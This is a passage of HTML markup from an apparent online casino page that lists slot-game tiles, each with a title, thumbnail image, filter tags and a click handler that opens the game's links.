                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/48ecef86c8130ce74dfea084d10c1e9f.webp?v=0.1" src="/assets/games/i/165x220/48ecef86c8130ce74dfea084d10c1e9f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Treasures of Osiris">Treasures of Osiris</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emerald King – Wheel of Wealth" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emerald King – Wheel of Wealth', '/assets/games/i/165x220/0b81068c8299ae3fe79703b2a7e21f0d.webp?v=0.1' , 'vs10dublin', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/0b81068c8299ae3fe79703b2a7e21f0d.webp?v=0.1" src="/assets/games/i/165x220/0b81068c8299ae3fe79703b2a7e21f0d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emerald King – Wheel of Wealth">Emerald King – Wheel of Wealth</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Knights vs Barbarians" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Knights vs Barbarians', '/assets/games/i/165x220/fb3eeb3931426b6d6930029b1b2e095c.webp?v=0.1' , 'vs10cenrlgdevl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/fb3eeb3931426b6d6930029b1b2e095c.webp?v=0.1" src="/assets/games/i/165x220/fb3eeb3931426b6d6930029b1b2e095c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Knights vs Barbarians">Knights vs Barbarians</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Stampede Ultimate" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Stampede Ultimate', '/assets/games/i/165x220/3e5f5e4d761f4f1aef59b0672a12d690.webp?v=0.1' , 'vswaysfirest3', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3e5f5e4d761f4f1aef59b0672a12d690.webp?v=0.1" src="/assets/games/i/165x220/3e5f5e4d761f4f1aef59b0672a12d690.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Stampede Ultimate">Fire Stampede Ultimate</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Magic Eggs" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Magic Eggs', '/assets/games/i/165x220/60aa466bb6921aef2452b36eadfc8835.webp?v=0.1' , 'vs25wolfgmm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/60aa466bb6921aef2452b36eadfc8835.webp?v=0.1" src="/assets/games/i/165x220/60aa466bb6921aef2452b36eadfc8835.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Magic Eggs">3 Magic Eggs</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Zeus vs Hades – Gods of War 250" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Zeus vs Hades – Gods of War 250', '/assets/games/i/165x220/37c5e18bf4515b0f6775d23d20630434.webp?v=0.2' , 'vs15zeushadseq', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/37c5e18bf4515b0f6775d23d20630434.webp?v=0.2" src="/assets/games/i/165x220/37c5e18bf4515b0f6775d23d20630434.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Zeus vs Hades – Gods of War 250">Zeus vs Hades – Gods of War 250</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cyberheist City" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cyberheist City', '/assets/games/i/165x220/b58588641f43f09e80ca45ca73684ff5.webp?v=0.1' , 'vswayscyhecity', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b58588641f43f09e80ca45ca73684ff5.webp?v=0.1" src="/assets/games/i/165x220/b58588641f43f09e80ca45ca73684ff5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cyberheist City">Cyberheist City</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Tiki Strike" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Tiki Strike', '/assets/games/i/165x220/e95ffa35200821aed09a47fe13d0a43e.webp?v=0.1' , 'vs5tikistrike', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e95ffa35200821aed09a47fe13d0a43e.webp?v=0.1" src="/assets/games/i/165x220/e95ffa35200821aed09a47fe13d0a43e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Tiki Strike">Super Tiki Strike</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Tiger Fortunes" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Tiger Fortunes', '/assets/games/i/165x220/cbf3d998fef5edbde12ff26b95b0145c.webp?v=0.1' , 'vswayshuffpbh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cbf3d998fef5edbde12ff26b95b0145c.webp?v=0.1" src="/assets/games/i/165x220/cbf3d998fef5edbde12ff26b95b0145c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Tiger Fortunes">Dragon Tiger Fortunes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Floating Dragon Wild Horses" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Floating Dragon Wild Horses', '/assets/games/i/165x220/711944b2d4c53197c6640c8d754eaba3.webp?v=0.1' , 'vs10fdwhorses', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/711944b2d4c53197c6640c8d754eaba3.webp?v=0.1" src="/assets/games/i/165x220/711944b2d4c53197c6640c8d754eaba3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Floating Dragon Wild Horses">Floating Dragon Wild Horses</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="King Of Spear" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'King Of Spear', '/assets/games/i/165x220/99e7cb8687e85a5f40bf87c4c5429332.webp?v=0.1' , 'vs20speark', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/99e7cb8687e85a5f40bf87c4c5429332.webp?v=0.1" src="/assets/games/i/165x220/99e7cb8687e85a5f40bf87c4c5429332.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="King Of Spear">King Of Spear</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot Tuna" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot Tuna', '/assets/games/i/165x220/89d7899b5a411f77e5506d4f88f3ae8b.webp?v=0.1' , 'vs10hottuna', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/89d7899b5a411f77e5506d4f88f3ae8b.webp?v=0.1" src="/assets/games/i/165x220/89d7899b5a411f77e5506d4f88f3ae8b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot Tuna">Hot Tuna</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wheel of Happiness" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wheel of Happiness', '/assets/games/i/165x220/94c11bf0859c76713ea1f080aaa0a64b.webp?v=0.1' , 'vswayswildeq', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/94c11bf0859c76713ea1f080aaa0a64b.webp?v=0.1" src="/assets/games/i/165x220/94c11bf0859c76713ea1f080aaa0a64b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wheel of Happiness">Wheel of Happiness</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker&amp;quot;amp;s Jewels Hold &amp;quot; Spin" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker&amp;quot;amp;s Jewels Hold &amp;quot; Spin', '/assets/games/i/165x220/53bbd6fc5d423253aac9dcb8a9b2e7ab.webp?v=0.1' , 'vs5jokjewhs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/53bbd6fc5d423253aac9dcb8a9b2e7ab.webp?v=0.1" src="/assets/games/i/165x220/53bbd6fc5d423253aac9dcb8a9b2e7ab.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker's Jewels Hold &amp; Spin">Joker's Jewels Hold &amp; Spin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Anaconda Gold" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Anaconda Gold', '/assets/games/i/165x220/2a0baf5c76291cf6d9939cfeca9159ab.webp?v=0.1' , 'vswaysacnd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2a0baf5c76291cf6d9939cfeca9159ab.webp?v=0.1" src="/assets/games/i/165x220/2a0baf5c76291cf6d9939cfeca9159ab.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Anaconda Gold">Anaconda Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hammerstorm" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hammerstorm', '/assets/games/i/165x220/a366b346c75df437d7dd2acea9e38cd6.webp?v=0.2' , 'vs40hmrstrm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a366b346c75df437d7dd2acea9e38cd6.webp?v=0.2" src="/assets/games/i/165x220/a366b346c75df437d7dd2acea9e38cd6.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hammerstorm">Hammerstorm</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Splash 1000" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Splash 1000', '/assets/games/i/165x220/c3fdcde0ae94ab51b4a1f9fb3da7c1ec.webp?v=0.1' , 'vs10bbsplashx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c3fdcde0ae94ab51b4a1f9fb3da7c1ec.webp?v=0.1" src="/assets/games/i/165x220/c3fdcde0ae94ab51b4a1f9fb3da7c1ec.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Splash 1000">Big Bass Splash 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bloody Dawn" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bloody Dawn', '/assets/games/i/165x220/634805e9682434f591710860027c2d35.webp?v=0.1' , 'vswayswildb', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/634805e9682434f591710860027c2d35.webp?v=0.1" src="/assets/games/i/165x220/634805e9682434f591710860027c2d35.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bloody Dawn">Bloody Dawn</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Pyroth" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Pyroth', '/assets/games/i/165x220/aea074dbcc81208ca32cc7fe30ea0b0b.webp?v=0.1' , 'vs20shmnarise', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/aea074dbcc81208ca32cc7fe30ea0b0b.webp?v=0.1" src="/assets/games/i/165x220/aea074dbcc81208ca32cc7fe30ea0b0b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Pyroth">Gates of Pyroth</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Craze" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Craze', '/assets/games/i/165x220/e90e96b75ac135d9fefe4889bfd85179.webp?v=0.1' , 'vs20chestcol', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e90e96b75ac135d9fefe4889bfd85179.webp?v=0.1" src="/assets/games/i/165x220/e90e96b75ac135d9fefe4889bfd85179.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Craze">Sweet Craze</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Zeus vs Typhon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Zeus vs Typhon', '/assets/games/i/165x220/3c307b2654e21a1d0a7606dcb01f0378.webp?v=0.1' , 'vswaysreelbtl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3c307b2654e21a1d0a7606dcb01f0378.webp?v=0.1" src="/assets/games/i/165x220/3c307b2654e21a1d0a7606dcb01f0378.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Zeus vs Typhon">Zeus vs Typhon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa’s Slay" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa’s Slay', '/assets/games/i/165x220/39e70fff12811a6956a2f93a8728a85a.webp?v=0.1' , 'vs10santasl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/39e70fff12811a6956a2f93a8728a85a.webp?v=0.1" src="/assets/games/i/165x220/39e70fff12811a6956a2f93a8728a85a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa’s Slay">Santa’s Slay</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Gummy Strike" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Gummy Strike', '/assets/games/i/165x220/4210ac0069de292f91f2978bf74a32f5.webp?v=0.1' , 'vs5supergummy', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4210ac0069de292f91f2978bf74a32f5.webp?v=0.1" src="/assets/games/i/165x220/4210ac0069de292f91f2978bf74a32f5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Gummy Strike">Super Gummy Strike</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Christmas – Frozen Lake" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Christmas – Frozen Lake', '/assets/games/i/165x220/5f24f1c479248cfb89a525fdc93df7e5.webp?v=0.1' , 'vs10bbglxmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5f24f1c479248cfb89a525fdc93df7e5.webp?v=0.1" src="/assets/games/i/165x220/5f24f1c479248cfb89a525fdc93df7e5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Christmas – Frozen Lake">Big Bass Christmas – Frozen Lake</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Oracle of Gold" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Oracle of Gold', '/assets/games/i/165x220/5dd884921e8e35b28925f688bfe6c29e.webp?v=0.1' , 'vs20oragold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5dd884921e8e35b28925f688bfe6c29e.webp?v=0.1" src="/assets/games/i/165x220/5dd884921e8e35b28925f688bfe6c29e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Oracle of Gold">Oracle of Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pandemic Rising" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pandemic Rising', '/assets/games/i/165x220/192787f0e33c19a9cd0eca1f5ff435ce.webp?v=0.1' , 'vs40pdmrsg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/192787f0e33c19a9cd0eca1f5ff435ce.webp?v=0.1" src="/assets/games/i/165x220/192787f0e33c19a9cd0eca1f5ff435ce.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pandemic Rising">Pandemic Rising</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Riches Returns" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Riches Returns', '/assets/games/i/165x220/43c34c9190cafdeb75e21e7f1b15a2b6.webp?v=0.1' , 'vswayswwrichr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/43c34c9190cafdeb75e21e7f1b15a2b6.webp?v=0.1" src="/assets/games/i/165x220/43c34c9190cafdeb75e21e7f1b15a2b6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Riches Returns">Wild Wild Riches Returns</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Frightening Frankie" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Frightening Frankie', '/assets/games/i/165x220/120283964f6839a9ee7b602f234430e2.webp?v=0.1' , 'vs20frankie', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/120283964f6839a9ee7b602f234430e2.webp?v=0.1" src="/assets/games/i/165x220/120283964f6839a9ee7b602f234430e2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Frightening Frankie">Frightening Frankie</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bingo Mania" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bingo Mania', '/assets/games/i/165x220/0676f990055665d938449652bbb24d10.webp?v=0.1' , 'vs30bingomania', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0676f990055665d938449652bbb24d10.webp?v=0.1" src="/assets/games/i/165x220/0676f990055665d938449652bbb24d10.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bingo Mania">Bingo Mania</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lava Balls" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lava Balls', '/assets/games/i/165x220/b46153cfe899648474b71bdaf13cbcfa.webp?v=0.1' , 'vswayslavabls', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b46153cfe899648474b71bdaf13cbcfa.webp?v=0.1" src="/assets/games/i/165x220/b46153cfe899648474b71bdaf13cbcfa.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lava Balls">Lava Balls</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chests of Cai Shen 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chests of Cai Shen 2', '/assets/games/i/165x220/0ba8642ef1a28049bd2cae9cc616807a.webp?v=0.1' , 'vs25caishen2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0ba8642ef1a28049bd2cae9cc616807a.webp?v=0.1" src="/assets/games/i/165x220/0ba8642ef1a28049bd2cae9cc616807a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chests of Cai Shen 2">Chests of Cai Shen 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Halloween 3" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Halloween 3', '/assets/games/i/165x220/4fc0b47627496bd7ab1d15d58b915915.webp?v=0.1' , 'vs10bhallbnza3', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4fc0b47627496bd7ab1d15d58b915915.webp?v=0.1" src="/assets/games/i/165x220/4fc0b47627496bd7ab1d15d58b915915.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Halloween 3">Big Bass Halloween 3</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wrath of Nezha" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wrath of Nezha', '/assets/games/i/165x220/bfbe32a9653ba5d125fcbe24e7ff36f5.webp?v=0.1' , 'vs40wrathnez', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bfbe32a9653ba5d125fcbe24e7ff36f5.webp?v=0.1" src="/assets/games/i/165x220/bfbe32a9653ba5d125fcbe24e7ff36f5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wrath of Nezha">Wrath of Nezha</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mermaid’s Treasure Trove" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mermaid’s Treasure Trove', '/assets/games/i/165x220/d61ab77483017bca6226a4d9d13a379c.webp?v=0.1' , 'vs20mmdtres', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d61ab77483017bca6226a4d9d13a379c.webp?v=0.1" src="/assets/games/i/165x220/d61ab77483017bca6226a4d9d13a379c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mermaid’s Treasure Trove">Mermaid’s Treasure Trove</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hundreds and Thousands" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hundreds and Thousands', '/assets/games/i/165x220/08192289605b35ef6718c84986052791.webp?v=0.1' , 'vs100hsandks', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/08192289605b35ef6718c84986052791.webp?v=0.1" src="/assets/games/i/165x220/08192289605b35ef6718c84986052791.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hundreds and Thousands">Hundreds and Thousands</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bigger Barn House Bonanza" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bigger Barn House Bonanza', '/assets/games/i/165x220/c3a1a891ab991effc070e1a8d65dfba4.webp?v=0.2' , 'vswaysbbarnh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c3a1a891ab991effc070e1a8d65dfba4.webp?v=0.2" src="/assets/games/i/165x220/c3a1a891ab991effc070e1a8d65dfba4.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bigger Barn House Bonanza">Bigger Barn House Bonanza</h5>
        </a>
        
     
